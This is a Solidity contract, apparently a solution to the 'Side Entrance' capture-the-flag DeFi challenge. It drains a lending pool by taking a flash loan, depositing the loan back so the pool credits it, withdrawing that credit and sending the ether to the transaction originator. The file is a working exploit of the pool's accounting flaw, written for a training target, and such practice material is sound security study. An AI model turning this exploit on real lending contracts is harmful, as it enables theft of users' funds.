// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract FlashLoanEtherReceiver {
    function infiltrate(
        SideEntranceLenderPool pool,
        uint256 amount
    ) public {
        pool.flashLoan(amount);

        pool.withdraw();

        // `msg.sender` is the address that calls `infiltrate`.
        // `FlashLoanEtherReceiverDeployer` in this case.
        //
        // `tx.origin` is the externally owned account that starts the whole transaction.
        payable(tx.origin).transfer(amount);
    }

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{
            value: msg.value
        }();
    }

    receive() external payable {}
}
